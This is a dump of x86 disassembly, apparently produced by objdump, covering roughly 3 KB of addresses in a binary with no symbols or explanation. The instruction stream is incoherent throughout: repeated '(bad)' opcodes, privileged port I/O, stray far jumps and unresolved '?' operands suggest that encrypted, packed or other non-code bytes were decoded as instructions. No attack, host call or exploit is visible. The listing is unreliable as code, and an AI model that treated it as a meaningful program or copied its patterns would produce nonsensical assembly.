  415c9e:	push   edx
  415c9f:	sar    BYTE PTR [esi*8+0x1c871774],1
  415ca6:	sbb    DWORD PTR [esi+0x63],esi
  415ca9:	daa    
  415caa:	retf   
  415cab:	push   ss
  415cac:	popa   
  415cad:	sub    ecx,DWORD PTR gs:[edi]
  415cb0:	xchg   ebx,eax
  415cb1:	lods   eax,DWORD PTR ds:[esi]
  415cb2:	std    
  415cb3:	movnti DWORD PTR [ecx+0x1d],ebp
  415cb7:	rcr    bh,1
  415cb9:	add    eax,0xd7d170e9
  415cbe:	add    eax,0xfa5c
	...
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0x3998:0xb4b2e72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    BYTE PTR [ebp+0x6cb1b1ed],dh
  415d51:	mov    dl,0xb7
  415d53:	or     al,BYTE PTR [edx]
  415d55:	icebp  
  415d56:	and    DWORD PTR [ecx+ecx*4],edx
  415d59:	pop    ds
  415d5a:	out    0x82,al
  415d5c:	lock rcl DWORD PTR [ebp+0x2703cd12],0x8
  415d64:	jle    0x415d77
  415d66:	pusha  
  415d67:	mov    al,0x58
  415d69:	mov    al,BYTE PTR [edx-0x75]
  415d6c:	syscall 
  415d6e:	add    al,0xbf
  415d70:	and    DWORD PTR [ebx+edx*1-0x4e],ecx
  415d74:	imul   edi,ebp,0x41b1ee7a
  415d7a:	in     al,dx
  415d7b:	mov    bh,BYTE PTR [edx-0xf]
  415d7e:	adc    eax,0xa4259c5a
  415d83:	lahf   
  415d84:	jo     0x415d30
  415d86:	or     eax,0x2478faca
  415d8b:	iret   
  415d8c:	sbb    eax,0x5bbe9e60
  415d91:	scas   eax,DWORD PTR es:[edi]
  415d92:	mov    bh,0xaf
  415d94:	dec    esp
  415d95:	stc    
  415d96:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d98:	bound  esi,QWORD PTR [esi-0x2ed34632]
  415d9e:	lods   al,BYTE PTR ds:[esi]
  415d9f:	stos   BYTE PTR es:[edi],al
  415da0:	out    dx,al
  415da1:	xchg   ebp,eax
  415da2:	(bad)  
  415da3:	push   ecx
  415da4:	pop    eax
  415da5:	sub    al,0x48
  415da7:	sub    BYTE PTR [ebx-0x135122f6],dh
  415dad:	jne    0x415de1
  415daf:	sbb    al,0x1a
  415db1:	mov    edx,0x255745a1
  415db6:	pop    ebp
  415db7:	(bad)  
  415db8:	xor    dl,bl
  415dba:	in     eax,0x84
  415dbc:	leave  
  415dbd:	sti    
  415dbe:	add    cl,BYTE PTR [edi-0x36d226ba]
  415dc4:	sbb    al,al
  415dc6:	push   eax
  415dc7:	mov    cl,0xdf
  415dc9:	sub    eax,0x746831fb
  415dce:	stc    
  415dcf:	sbb    eax,0xd8db2d2d
  415dd4:	ds inc edi
  415dd6:	into   
  415dd7:	and    al,0xd4
  415dd9:	mov    dl,0xdf
  415ddb:	push   cs
  415ddc:	shl    dh,1
  415dde:	jge    0x415e55
  415de0:	(bad)  
  415de1:	push   ebx
  415de2:	in     eax,0xd8
  415de4:	pop    edi
  415de5:	test   DWORD PTR [ebx+0x64],eax
  415de8:	cs dec esp
  415dea:	lods   al,BYTE PTR ds:[esi]
  415deb:	ret    
  415dec:	ret    0xa21c
  415def:	cli    
  415df0:	push   0xb7b4013c
  415df5:	cld    
  415df6:	and    cl,0xa1
  415df9:	mov    bh,0xde
  415dfb:	fwait
  415dfc:	add    eax,0xa00eda79
  415e01:	ss into 
  415e03:	aad    0x58
  415e05:	and    ebp,edx
  415e07:	scas   eax,DWORD PTR es:[edi]
  415e08:	in     eax,0x9a
  415e0a:	test   BYTE PTR [ebp-0xb],dl
  415e0d:	and    eax,0x5de891df
  415e12:	ds pop ebp
  415e14:	lds    ecx,FWORD PTR [ecx-0x21563d49]
  415e1a:	out    0xc6,al
  415e1c:	cmp    eax,0x932e1261
  415e21:	mov    al,ds:0x34dca6a9
  415e26:	out    0x1e,eax
  415e28:	mov    al,0x58
  415e2a:	int    0xe6
  415e2c:	ret    
  415e2d:	jl     0x415e52
  415e2f:	lahf   
  415e30:	mov    ch,0xe9
  415e32:	pop    ebp
  415e33:	(bad)
  415e36:	clc    
  415e37:	in     eax,0x7b
  415e39:	jp     0x415dc9
  415e3b:	rcr    DWORD PTR [edx],0x39
  415e3e:	push   ss
  415e3f:	lahf   
  415e40:	sbb    al,BYTE PTR [eax]
	...
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	dec    DWORD PTR gs:[ebp-0xfeceb56]
  415ec6:	add    BYTE PTR [eax],al
  415ec8:	cmc    
  415ec9:	add    BYTE PTR [eax],al
  415ecb:	add    cl,ch
  415ecd:	mov    al,0xb7
  415ecf:	std    
  415ed0:	push   edi
  415ed1:	pop    ds
  415ed2:	std    
  415ed3:	pop    esi
  415ed4:	mov    ah,0xb7
  415ed6:	enter  0x2555,0x76
  415eda:	add    dh,BYTE PTR [esi]
  415edc:	add    edx,DWORD PTR [ebx+0x5a]
  415edf:	lock jnp 0x415f5a
  415ee2:	es loop 0x415ed0
  415ee5:	push   0x43552329
  415eea:	jmp    0xf49e:0x4c2e4d62
  415ef1:	daa    
  415ef2:	in     eax,0x5f
  415ef4:	xchg   ebp,eax
  415ef5:	adc    ebx,DWORD PTR [eax-0x59]
  415ef8:	pop    edx
  415ef9:	outs   dx,DWORD PTR ds:[esi]
  415efa:	xchg   ebx,eax
  415efb:	mov    ebp,ds
  415efd:	pop    ebp
  415efe:	dec    ecx
  415eff:	mov    al,0x7
  415f01:	pop    edi
  415f02:	push   ecx
  415f03:	adc    WORD PTR [esi+0x297208fc],ax
  415f0a:	push   ebp
  415f0b:	push   es
  415f0c:	js     0x415eec
  415f0e:	jge    0x415ed1
  415f10:	cld    
  415f11:	mov    DWORD PTR [edi+0x23273c4a],ebx
  415f17:	(bad)  
  415f18:	jge    0x415f6e
  415f1a:	push   ebx
  415f1b:	icebp  
  415f1c:	or     eax,DWORD PTR [esi+edx*4+0x63]
  415f20:	pop    esp
  415f21:	adc    eax,0x47439ec7
  415f26:	shl    esp,0x71
  415f29:	int3   
  415f2a:	xor    al,0xcc
  415f2c:	(bad)  
  415f2d:	push   edx
  415f2e:	out    0x62,al
  415f30:	mov    ebx,0x91d16d52
  415f35:	fdiv   DWORD PTR [edi-0x29c5a381]
  415f3b:	daa    
  415f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3d:	jmp    0x415f85
  415f3f:	pop    esp
  415f40:	rcr    bh,0x86
  415f43:	inc    ecx
  415f44:	mov    bl,0x92
  415f46:	cmp    cl,bl
  415f48:	jecxz  0x415f0f
  415f4a:	dec    esi
  415f4b:	mov    dh,0x49
  415f4d:	dec    ebp
  415f4e:	sub    DWORD PTR [ebx-0x1e],eax
  415f51:	add    dh,bl
  415f53:	jge    0x415edf
  415f55:	inc    esi
  415f56:	lock xchg ecx,eax
  415f58:	mov    ?,WORD PTR [edi+ebx*4-0x34]
  415f5c:	pop    ds
  415f5d:	outs   dx,DWORD PTR ds:[esi]
  415f5e:	pop    es
  415f5f:	lock jne 0x415f24
  415f62:	mov    bh,0xc3
  415f64:	mov    bl,0x0
  415f67:	push   es
  415f68:	icebp  
  415f69:	popa   
  415f6a:	pop    ecx
  415f6b:	fwait
  415f6c:	push   cs
  415f6d:	add    ecx,0x91eb87a3
  415f73:	lods   al,BYTE PTR ds:[esi]
  415f74:	xchg   esp,eax
  415f75:	cdq    
  415f76:	dec    ecx
  415f77:	das    
  415f78:	inc    eax
  415f79:	xlat   BYTE PTR ds:[ebx]
  415f7a:	ret    0x9280
  415f7d:	xlat   BYTE PTR ds:[ebx]
  415f7e:	imul   esi,esp,0x21
  415f81:	jmp    0x49bb:0x4474d5ca
  415f88:	test   DWORD PTR [ecx-0x7e],0x8e392829
  415f8f:	shl    DWORD PTR [edi-0x5c],1
  415f92:	jo     0x415fbf
  415f94:	jecxz  0x415f43
  415f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f97:	addr16 leave 
  415f99:	stos   DWORD PTR es:[edi],eax
  415f9a:	imul   esp,DWORD PTR es:[eax-0x3a],0x6d2aaa5f
  415fa2:	push   eax
  415fa3:	inc    edx
  415fa4:	jg     0x415f43
  415fa6:	shl    DWORD PTR [edx-0x70],0xfa
  415faa:	ret    0x58bc
  415fad:	add    eax,0xda819e12
  415fb2:	inc    esp
  415fb3:	in     eax,dx
  415fb4:	jns    0x415fbe
  415fb6:	or     edx,DWORD PTR [esi-0x5d]
  415fb9:	push   edi
  415fba:	repz sti 
  415fbc:	aas    
  415fbd:	aam    0xed
  415fbf:	push   ebx
  415fc0:	mov    al,ds:0x0
	...
  416031:	add    BYTE PTR [eax],al
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   edx,ebx,0xfffffffd
  416042:	jae    0x416040
  416044:	or     cl,dh
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    BYTE PTR [edi+0x6e],ch
  41604e:	xchg   edx,eax
  41604f:	xlat   BYTE PTR ds:[ebx]
  416050:	call   0xcf8bcadd
  416055:	stos   BYTE PTR es:[edi],al
  416056:	xchg   edi,eax
  416057:	or     bl,BYTE PTR [edi]
  416059:	mov    eax,0xfea87fd2
  41605e:	(bad)  [esi+0x45]
  416061:	shl    DWORD PTR [eax+0x6a],0x95
  416065:	inc    eax
  416066:	adc    eax,0x98cb8d4c
  41606b:	dec    ebx
  41606c:	(bad)  
  41606e:	push   ebp
  41606f:	rcl    BYTE PTR [edi+0x4b],0xc8
  416073:	or     BYTE PTR [eax-0x512ff622],ch
  416079:	xchg   ah,ah
  41607b:	mov    ds:0xa6a44db1,eax
  416080:	js     0x41602f
  416082:	and    al,BYTE PTR [edi+0x53]
  416085:	mov    ecx,?
  416087:	mov    WORD PTR [edi+0x729542c8],?
  41608d:	bound  esi,QWORD PTR [eax-0x10]
  416090:	mov    eax,0x92a7a1b6
  416095:	jg     0x416084
  416097:	(bad)  
  416098:	jle    0x41603f
  41609a:	inc    eax
  41609b:	pop    edx
  41609c:	lods   al,BYTE PTR ds:[esi]
  41609d:	mov    al,ds:0x36f3c8a1
  4160a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a3:	xlat   BYTE PTR ds:[ebx]
  4160a4:	outs   dx,BYTE PTR ds:[esi]
  4160a5:	ss sti 
  4160a7:	aad    0xef
  4160a9:	imul   ebp,DWORD PTR [edx-0x6d2c1afb],0x6022c2c8
  4160b3:	test   BYTE PTR [edx-0x31],al
  4160b6:	in     al,dx
  4160b7:	pop    eax
  4160b8:	mov    edx,0xd3ee6226
  4160bd:	retf   0x9122
  4160c0:	xor    edx,DWORD PTR [edi-0x627c4162]
  4160c6:	daa    
  4160c7:	pop    eax
  4160c8:	and    DWORD PTR [edi],ecx
  4160ca:	scas   eax,DWORD PTR es:[edi]
  4160cb:	fisub  WORD PTR [esp+eax*4+0xd982ec4]
  4160d2:	hlt    
  4160d3:	icebp  
  4160d4:	rol    BYTE PTR [ebx+0x213c1dc7],0xae
  4160db:	push   es
  4160dc:	pop    esi
  4160dd:	loopne 0x41613d
  4160df:	mov    eax,0xcc625c7f
  4160e4:	and    eax,0x8f8b905f
  4160e9:	mov    eax,ds:0xa5de70ca
  4160ee:	inc    edx
  4160ef:	jge    0x41612b
  4160f1:	dec    ecx
  4160f2:	xchg   edi,eax
  4160f3:	push   ebx
  4160f4:	add    cl,BYTE PTR [ebp-0x595a0ff4]
  4160fa:	xor    BYTE PTR [edi+0x2fd3207],ch
  416100:	mov    ah,dl
  416102:	pop    ds
  416103:	and    al,0x13
  416105:	push   eax
  416106:	mov    al,BYTE PTR [eax]
  416108:	hlt    
  416109:	sbb    ch,BYTE PTR [esi-0x2a]
  41610c:	fs stos BYTE PTR es:[edi],al
  41610e:	iret   
  41610f:	std    
  416110:	xor    ch,BYTE PTR [ecx+ecx*4-0x5f]
  416114:	imul   ebp,DWORD PTR [ebp-0x17],0xffffffd9
  416118:	(bad)  
  416119:	mov    ecx,0x9c10b75b
  41611e:	and    BYTE PTR [ebp+0xa],dl
  416121:	lea    ecx,[edx+edi*2-0x40]
  416125:	add    ah,ah
  416127:	mov    ebp,0xd3d7c62e
  41612c:	xor    eax,0x211e052f
  416131:	in     al,0xb2
  416133:	jmp    0x41619b
  416135:	xor    BYTE PTR [eax-0x22709f9c],dh
  41613b:	js     0x4160e5
  41613d:	daa    
  41613e:	cmp    al,0xdc
  416140:	test   eax,0x0
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    edi,DWORD PTR [esi-0x2e67ac4]
  4161c5:	icebp  
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	cmc    
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    ah,ch
  4161cd:	leave  
  4161ce:	mov    eax,0x3fc3db31
  4161d3:	adc    DWORD PTR [ebx],ebx
  4161d5:	call   0x7b5a310e
  4161da:	enter  0x3493,0x7b
  4161de:	and    al,0x5c
  4161e0:	inc    ebp
  4161e1:	ss jo  0x416249
  4161e4:	sbb    eax,0x9969b0b8
  4161e9:	rol    edx,0x78
  4161ec:	mov    esp,0xda35c163
  4161f1:	mov    al,ds:0xcaf59a3d
  4161f6:	sar    esi,0xac
  4161f9:	mov    ch,0xd2
  4161fb:	fsub   QWORD PTR [ebx+ebx*8]
  4161fe:	fcomp  QWORD PTR [esi-0x48]
  416201:	out    dx,al
  416202:	mov    ds:0x1da71a79,eax
  416207:	pusha  
  416208:	pop    ss
  416209:	mov    bh,0xd4
  41620b:	fsub   DWORD PTR [ebx]
  41620d:	retf   0x8e2e
  416210:	enter  0x8f,0x8
  416214:	cdq    
  416215:	mov    DWORD PTR [eax+0x88db5f0],edx
  41621b:	mov    dl,0xeb
  41621d:	push   ecx
  41621e:	into   
  41621f:	push   0x54eeabc5
  416224:	and    BYTE PTR [eax-0x4d],ch
  416227:	mov    dl,0xd0
  416229:	adc    ah,dl
  41622b:	in     eax,dx
  41622c:	push   ebp
  41622d:	mul    DWORD PTR [ebx]
  41622f:	inc    esp
  416230:	aad    0x14
  416232:	in     al,0xac
  416234:	mov    ds,WORD PTR [esi+0x18]
  416237:	xor    ecx,DWORD PTR [ecx+0x26]
  41623a:	jmp    0x4162ae
  41623c:	jmp    0x9bccc30d
  416241:	aam    0x55
  416243:	inc    edx
  416244:	imul   DWORD PTR [esi+0x7e]
  416247:	gs push edi
  416249:	pop    esp
  41624a:	or     al,BYTE PTR [eax-0xcb67505]
  416250:	test   al,0xd7
  416252:	lods   eax,DWORD PTR ds:[esi]
  416253:	in     al,dx
  416254:	push   ebp
  416255:	xor    BYTE PTR [edx+eiz*8+0x2cb8534a],al
  41625c:	xchg   ebp,eax
  41625d:	cli    
  41625e:	pushf  
  41625f:	dec    ebp
  416260:	dec    eax
  416261:	xchg   ebp,eax
  416262:	adc    al,0x8
  416264:	test   WORD PTR [edx-0x5880585b],0x6e9f
  41626d:	xlat   BYTE PTR ds:[ebx]
  41626e:	iret   
  41626f:	jp     0x416267
  416271:	push   cs
  416272:	mov    bh,0xb7
  416274:	addr16 (bad) 
  416276:	in     al,0x4e
  416278:	add    DWORD PTR [edx+0x24],ebx
  41627b:	jo     0x4162e4
  41627d:	push   0xffffff8e
  41627f:	mov    ebx,0x542162a7
  416284:	cmp    eax,0xf3d769c
  416289:	ds mov ch,0x8
  41628c:	inc    esp
  41628d:	mov    esi,0x22a73b05
  416292:	sub    esi,DWORD PTR [ebx]
  416294:	and    BYTE PTR [eax-0x617f01a],dl
  41629a:	add    DWORD PTR [esi+0x416a688b],0x36
  4162a1:	mov    ch,0xf7
  4162a3:	out    0x22,eax
  4162a5:	pop    ebx
  4162a6:	jb     0x416258
  4162a8:	das    
  4162a9:	cld    
  4162aa:	jo     0x41630d
  4162ac:	aam    0x4c
  4162ae:	into   
  4162af:	cmp    DWORD PTR [esi-0x5b],ecx
  4162b2:	fnsave [edi-0x4a1efd32]
  4162b8:	pushf  
  4162b9:	adc    esp,DWORD PTR [edi+edx*4]
  4162bc:	scas   al,BYTE PTR es:[edi]
  4162bd:	push   0x44469e
	...
  416332:	add    BYTE PTR [eax],al
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	lock repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	(bad)  
  416341:	mov    dh,0x93
  416343:	shl    dl,1
  416345:	repnz add BYTE PTR [eax],al
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    BYTE PTR ds:0xcd1e86f,cl
  416351:	mul    DWORD PTR [edx+0x2c5d20d0]
  416357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416358:	lock mov ebx,eax
  41635b:	sbb    BYTE PTR [ebp+0x2b799f8c],bh
  416361:	cmp    DWORD PTR [edi],esi
  416363:	mov    WORD PTR [ebp-0x27],?
  416366:	lds    ebx,FWORD PTR [edx+edi*8-0x6f]
  41636a:	jl     0x41633f
  41636c:	inc    ebx
  41636d:	push   0x9b41c7ba
  416372:	js     0x416358
  416374:	dec    ecx
  416375:	xchg   BYTE PTR [ecx-0x25],ch
  416378:	mov    edx,0xb5282002
  41637d:	push   ss
  41637e:	sub    edx,DWORD PTR [ebp+0x68f61ad4]
  416384:	cld    
  416385:	xor    BYTE PTR [esi],ch
  416387:	xchg   esp,eax
  416388:	lods   al,BYTE PTR ds:[esi]
  416389:	mov    edi,0x9e3c7754
  41638e:	sbb    al,bl
  416390:	mov    edi,0xc2d6a9b0
  416395:	dec    ebx
  416396:	or     ebp,DWORD PTR [ecx]
  416398:	fcmovnb st,st(7)
  41639a:	ds out 0x3c,eax
  41639d:	cld    
  41639e:	mov    esp,0xed6b7d48
  4163a3:	jo     0x416402
  4163a5:	jns    0x41639b
  4163a7:	push   ecx
  4163a8:	and    al,0x61
  4163aa:	xchg   ecx,eax
  4163ab:	(bad)  
  4163ac:	xor    DWORD PTR [ebx],esi
  4163ae:	pop    ds
  4163af:	(bad)  
  4163b0:	pop    ecx
  4163b1:	xor    cl,BYTE PTR [ecx-0x52]
  4163b4:	push   DWORD PTR [ebp-0x647198cf]
  4163ba:	out    0x8d,eax
  4163bc:	sub    al,0x49
  4163be:	cmp    eax,0xe13a810e
  4163c3:	dec    ecx
  4163c4:	and    al,0x6e
  4163c6:	fdivr  DWORD PTR ds:[ebx+edx*2+0x705d5c76]
  4163ce:	cmc    
  4163cf:	(bad)  
  4163d1:	je     0x4163a0
  4163d3:	mov    al,0xff
  4163d5:	fs cmp al,0xe0
  4163d8:	cmp    DWORD PTR [edx-0x73],esp
  4163db:	mov    ?,WORD PTR [edx*8+0x7bfc9d91]
  4163e2:	aaa    
  4163e3:	dec    ebx
  4163e4:	mov    ds:0x96ad3e37,eax
  4163e9:	cmp    al,0xd5
  4163eb:	adc    ecx,DWORD PTR [ebx]
  4163ed:	jl     0x41643f
  4163ef:	cmove  ecx,DWORD PTR [edi-0x2f19efd]
  4163f6:	pop    es
  4163f7:	jmp    0x41644c
  4163f9:	inc    ecx
  4163fa:	lea    edi,[esi]
  4163fc:	test   al,0x4a
  4163fe:	mov    ch,0x76
  416400:	pop    es
  416401:	sub    bl,BYTE PTR [edx-0x54]
  416404:	out    0xbd,eax
  416406:	cmp    esi,edi
  416408:	inc    ecx
  416409:	scas   eax,DWORD PTR es:[edi]
  41640a:	ins    DWORD PTR es:[edi],dx
  41640b:	cmp    ah,0xab
  41640e:	push   eax
  41640f:	push   0x6bc9c968
  416414:	mov    al,0x12
  416416:	jns    0x4163f3
  416418:	nop
  416419:	mov    esi,0xf661fed6
  41641e:	stos   DWORD PTR es:[edi],eax
  41641f:	mov    ecx,0x95718e44
  416424:	inc    esp
  416425:	xlat   BYTE PTR ds:[ebx]
  416426:	daa    
  416427:	inc    edi
  416428:	adc    DWORD PTR [ecx-0x339a2816],esi
  41642e:	sub    al,0x6a
  416430:	jle    0x4163f4
  416432:	and    eax,0xeb06f4d9
  416437:	shr    DWORD PTR [ebx+0x6e],0xe
  41643b:	push   ebp
  41643c:	jbe    0x4163db
  41643e:	fstp   DWORD PTR [ebx+0x7c]
	...
  4164b4:	in     al,0xf0
  4164b6:	sub    DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	fcomp  DWORD PTR [ebp-0xc18deb1]
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [ebx-0x69],cl
  4164ce:	add    dh,BYTE PTR [ecx]
  4164d0:	pop    edi
  4164d1:	jns    0x416453
  4164d3:	or     BYTE PTR [eax],0x57
  4164d6:	or     dh,BYTE PTR [eax-0x4f]
  4164d9:	mov    DWORD PTR [edi-0x3e60c034],esi
  4164df:	pop    edx
  4164e0:	leave  
  4164e1:	aas    
  4164e2:	inc    ebx
  4164e3:	xchg   edx,eax
  4164e4:	jne    0x4164f5
  4164e6:	pop    ecx
  4164e7:	(bad)  
  4164e8:	stos   DWORD PTR es:[edi],eax
  4164e9:	mov    eax,DWORD PTR [ecx+0x3b10ecac]
  4164ef:	stos   BYTE PTR es:[edi],al
  4164f0:	xor    BYTE PTR [esi+0x5b],al
  4164f3:	dec    edi
  4164f4:	adc    DWORD PTR [esi-0xab94954],0x1dfb2ca6
  4164fe:	test   al,0x2b
  416500:	mov    BYTE PTR [ebx+ebx*4],cl
  416503:	push   ebx
  416504:	mov    cl,0xc3
  416506:	ret    0xd6a9
  416509:	inc    ecx
  41650a:	xchg   ecx,eax
  41650b:	jmp    0xbb8ae2c5
  416510:	sbb    eax,0x47482fbc
  416515:	mov    ebx,0xaa884c6
  41651a:	xchg   ebp,eax
  41651b:	scas   al,BYTE PTR es:[edi]
  41651c:	jg     0x41654f
  41651e:	pushf  
  41651f:	and    BYTE PTR [ebx+0x5f388c5c],bh
  416525:	sbb    bh,bl
  416527:	and    al,0xdf
  416529:	xchg   edi,eax
  41652a:	daa    
  41652b:	mov    cl,0xd4
  41652d:	mov    ecx,0x7f2af4f9
  416532:	rol    BYTE PTR [ebx+0x71bffc65],0xd4
  416539:	test   eax,0xd2b8ff7f
  41653e:	or     eax,0xbe84ee27
  416543:	fmul   st,st(2)
  416545:	sbb    eax,0xe83b4f29
  41654a:	push   ebx
  41654b:	inc    ebx
  41654c:	jo     0x416558
  41654e:	es push ecx
  416550:	das    
  416551:	push   ebp
  416552:	push   ds
  416553:	call   0x1473:0x8c27132f
  41655a:	push   0x2ab7604d
  41655f:	(bad)  
  416561:	in     eax,0x1b
  416563:	sar    BYTE PTR [edi+0x22c3af1f],0xf6
  41656a:	mov    ds:0xedd540de,al
  41656f:	xchg   ebp,eax
  416570:	aam    0x3d
  416572:	je     0x416597
  416574:	and    al,0xea
  416576:	dec    DWORD PTR [ebx]
  416578:	pop    eax
  416579:	mov    ?,WORD PTR [edx-0x23d74fa7]
  41657f:	xor    BYTE PTR [esi],0xb6
  416582:	push   ss
  416583:	iret   
  416584:	xor    BYTE PTR ds:0xd756efd6,ah
  41658a:	add    esp,DWORD PTR ss:[ebp+esi*4-0x34]
  41658f:	xor    eax,0x2aae9689
  416594:	and    BYTE PTR [ebp+0x56394f41],ch
  41659a:	inc    edx
  41659b:	mov    edx,0x7641ee88
  4165a0:	test   DWORD PTR [edi+0x3cedf6ae],0xf92102ac
  4165aa:	add    edi,esi
  4165ac:	les    edx,FWORD PTR [esp+eiz*2]
  4165af:	mov    ecx,0xc23195a3
  4165b4:	ins    DWORD PTR es:[edi],dx
  4165b5:	jmp    0x41656b
  4165b7:	pop    ebp
  4165b8:	xor    eax,0x5c698116
  4165bd:	test   al,0xe6
  4165bf:	mov    eax,DWORD PTR [ebp+0x0]
	...
  416631:	add    BYTE PTR [eax],al
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	sub    al,0x57
  416642:	inc    edi
  416643:	mov    al,ds:0xf4dc
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [edx+0x13],cl
  41664e:	ret    
  41664f:	cwde   
  416650:	pop    ecx
  416651:	mov    cl,0x5
  416653:	nop
  416654:	or     eax,edx
  416656:	fadd   DWORD PTR [eax]
  416658:	mov    dl,0x42
  41665a:	adc    ecx,ebp
  41665c:	dec    eax
  41665d:	sbb    bl,al
  41665f:	(bad)  
  416660:	cmp    edi,edx
  416662:	inc    ecx
  416663:	arpl   WORD PTR [esi],cx
  416665:	mov    ecx,DWORD PTR [esi]
  416667:	pop    esp
  416668:	test   DWORD PTR [ebp+ebp*1-0x58],edi
  41666c:	popa   
  41666d:	cli    
  41666e:	int3   
  41666f:	add    BYTE PTR [edi-0x71fde371],0x73
  416676:	or     DWORD PTR [eax-0x13d3cde3],0x83f90714
  416680:	mov    ecx,ss
  416682:	mov    al,0xd3
  416684:	mov    bh,0xf
  416686:	ins    DWORD PTR es:[edi],dx
  416687:	sbb    ecx,DWORD PTR [edi]
  416689:	daa    
  41668a:	mov    ecx,0x17521fc7
  41668f:	inc    ebp
  416690:	rol    BYTE PTR [edx-0xabf272],1
  416696:	hlt    
  416697:	cwde   
  416698:	std    
  416699:	jg     0x4166d4
  41669b:	adc    dl,BYTE PTR [edi+0x33c670eb]
  4166a1:	not    BYTE PTR es:[esp+edx*8-0x2ec6e26a]
  4166a9:	neg    DWORD PTR [eax+0x69b2af8b]
  4166af:	jl     0x4166e9
  4166b1:	mov    ah,0x7b
  4166b3:	inc    edx
  4166b4:	mov    edi,0xb9a2119
  4166b9:	scas   al,BYTE PTR es:[edi]
  4166ba:	adc    ebp,eax
  4166bc:	ins    DWORD PTR es:[edi],dx
  4166bd:	out    dx,al
  4166be:	addr16 push edx
  4166c0:	jge    0x416646
  4166c2:	outs   dx,BYTE PTR ds:[esi]
  4166c3:	dec    esi
  4166c4:	inc    ecx
  4166c5:	add    ch,BYTE PTR [ebp-0x4c]
  4166c8:	push   ebx
  4166c9:	ret    0xe18c
  4166cc:	pop    eax
  4166cd:	push   ss
  4166ce:	push   ebx
  4166cf:	cmp    ecx,DWORD PTR [eax]
  4166d1:	aas    
  4166d2:	push   ds
  4166d3:	popf   
  4166d4:	es test dh,dl
  4166d7:	shl    BYTE PTR [ecx+0x5a],1
  4166da:	sub    eax,ebx
  4166dc:	cli    
  4166dd:	loopne 0x416689
  4166df:	cmp    al,0xfe
  4166e1:	xchg   esi,eax
  4166e2:	and    BYTE PTR [edx+0xb2ce2f7],cl
  4166e8:	inc    esp
  4166e9:	call   0x362e1432
  4166ee:	xchg   ecx,ebp
  4166f0:	cdq    
  4166f1:	jge    0x416732
  4166f3:	inc    esp
  4166f4:	mov    ?,WORD PTR [esi-0x58e1c7f3]
  4166fa:	adc    dl,BYTE PTR [ebp+0x46]
  4166fd:	jns    0x4166b8
  4166ff:	jg     0x416741
  416701:	mov    esp,0xf23d4f33
  416706:	ins    BYTE PTR es:[edi],dx
  416707:	not    BYTE PTR [ebp+eiz*2-0x8ecdb34]
  41670e:	mov    al,ds:0x98c676c2
  416713:	hlt    
  416714:	cmp    BYTE PTR [esi-0x27],cl
  416717:	cmp    DWORD PTR [ecx],ebx
  416719:	dec    edx
  41671a:	jnp    0x41675a
  41671c:	hlt    
  41671d:	mov    dh,0x74
  41671f:	add    esi,DWORD PTR ds:0xa16a0644
  416725:	jmp    0xfdc:0x8c458941
  41672c:	push   eax
  41672d:	cld    
  41672e:	and    ecx,DWORD PTR [edi]
  416730:	xchg   ecx,eax
  416731:	or     BYTE PTR [eax],dh
  416733:	push   ds
  416734:	in     eax,dx
  416735:	stos   DWORD PTR es:[edi],eax
  416736:	xchg   esi,eax
  416737:	mov    BYTE PTR [esi-0x79],al
  41673a:	gs add eax,0x32571aa8
  416740:	fld    QWORD PTR [eax]
	...
  4167b2:	add    BYTE PTR [eax],al
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm6,DWORD PTR [ebp-0x5d]
  4167c2:	dec    esp
  4167c3:	cdq    
  4167c4:	shl    ebp,1
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	cmc    
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [eax+edi*1-0x3a],bl
  4167cf:	arpl   sp,di
  4167d1:	sbb    ecx,ebp
  4167d3:	fwait
  4167d4:	lods   al,BYTE PTR ds:[esi]
  4167d5:	inc    edx
  4167d6:	outs   dx,BYTE PTR ds:[esi]
  4167d7:	xchg   edi,eax
  4167d8:	inc    esp
  4167d9:	inc    eax
  4167da:	jbe    0x41675c
  4167dc:	jae    0x4167fb
  4167de:	fs pop eax
  4167e0:	repz into 
